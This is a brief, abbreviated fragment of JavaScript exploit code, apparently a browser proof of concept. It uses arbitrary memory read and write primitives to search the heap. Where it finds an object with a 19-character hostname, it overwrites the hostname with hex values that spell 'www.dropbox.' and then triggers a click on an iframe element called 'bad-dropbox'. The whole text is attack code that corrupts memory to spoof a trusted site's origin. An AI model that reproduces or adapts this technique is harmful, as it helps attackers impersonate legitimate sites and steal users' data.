            ...
            if (c==cc && cc==ccc && ccc==0)
            {
                var d = read32(heap_base+x+7*4);
                {
                    ...
                    if (hostname_len == 19) 
                    {
                        ...
                        write32(hostname_addr + 0xc + 4*0, 0x2e777777);
                        write32(hostname_addr + 0xc + 4*1, 0x706f7264);
                        write32(hostname_addr + 0xc + 4*2, 0x2e786f62);
...
document.getElementById('prep').contentDocument.getElementById('bad-dropbox').click();
